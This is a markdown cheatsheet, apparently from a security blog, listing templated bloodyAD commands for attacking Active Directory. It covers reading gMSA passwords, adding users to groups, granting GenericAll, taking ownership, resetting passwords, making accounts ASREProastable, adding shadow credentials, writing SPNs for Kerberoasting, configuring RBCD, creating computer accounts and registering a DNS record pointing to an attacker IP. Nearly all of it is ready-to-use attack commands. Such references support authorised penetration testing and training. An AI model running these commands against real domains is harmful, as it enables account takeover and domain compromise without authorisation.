---
pubDate: 07-15-2026
description: BloodyAD Cheatsheet
heroImage: '../../assets/cheatsheets/bloodyad/banner.png'
title: BloodyAD
---

## Overview
- Use -k for Kerberos authentication

- NTLM hash authentication: -p :{{$NTLM_HASH}}

- Specify auth format with -f (e.g. -f rc4)

### 🔍 Enumeration / Read Operations

- Retrieve user information

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} get object {{$TARGET_USER}}`

- Read gMSA (Group Managed Service Account password)

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} get object {{$TARGET_USER}} --attr msDS-ManagedPassword`

- Check userPrincipalName (UPN)

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} get object {{$TARGET_USER}} --attr userPrincipalName`

- Find writable attributes

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} get writable --detail`

- Find writable attributes including deleted objects

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} get writable --include-del`

- Enumerate MachineAccountQuota

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota`

### 👥 Group & ACL Abuse

- Add user to group

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} add groupMember {{$GROUP}} {{$ACCOUNT}}`

- Grant GenericAll rights over an object

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} add genericAll {{$TARGET_DN}} {{$ACCOUNT}}`

- WriteOwner (take ownership of object)

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} set owner {{$TARGET_OBJECT}} {{$ACCOUNT}}`

### 🔐 Account Manipulation

- Change user password

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} set password {{$TARGET_USER}} {{$NEW_PASSWORD}}`

- Enable a disabled account

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} remove uac {{$TARGET_USER}} -f ACCOUNTDISABLE`

- Add TRUSTED_TO_AUTH_FOR_DELEGATION flag

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} add uac {{$TARGET_USER}} -f TRUSTED_TO_AUTH_FOR_DELEGATION`

- Make account ASREProastable

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST_NAME}} --dc-ip {{$DC_IP}} -k add uac {{$ACCOUNT}} -f DONT_REQ_PREAUTH`

- Modify userPrincipalName (UPN)

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} set object {{$TARGET_USER}} userPrincipalName -v {{$NEW_UPN}}`

- Modify mail attribute

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} set object {{$TARGET_USER}} mail -v {{$NEW_MAIL}}`

- Modify altSecurityIdentities (ESC14B)

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} set object {{$TARGET_USER}} altSecurityIdentities -v 'X509:<RFC822>{{$EMAIL}}'`

### 🧠 Delegation & Kerberos Abuse

- Add Shadow Credentials

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} add shadowCredentials {{$TARGET}}`

- Write SPN (Kerberoasting / delegation abuse)

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} set object {{$TARGET}} servicePrincipalName -v '{{$DOMAIN}}/{{$SERVICE}}'`

- Add Resource-Based Constrained Delegation (RBCD)

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} add rbcd '{{$DELEGATE_TO}}$' '{{$DELEGATE_FROM}}$'`

### 🖥️ Computer & Domain Configuration

- Create a new computer account

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} add computer {{$COMPUTER_NAME}} {{$COMPUTER_PASSWORD}}`

- Set MachineAccountQuota to 10

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10`

### 🗑️ Deleted Objects / Advanced Search

- Extended search help

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} get search -h`

- Search tombstoned (deleted) objects

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065`

- Restore a deleted object

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} -k set restore {{$OBJECT_TO_RESTORE}}`

### 🌐 DNS Abuse

- Register a DNS record

`bloodyAD -d {{$DOMAIN}} --host {{$DC_HOST}} -u {{$USER}} -p {{$PASS}} add dnsRecord {{$RECORD_NAME}} {{$ATTACKER_IP}}`

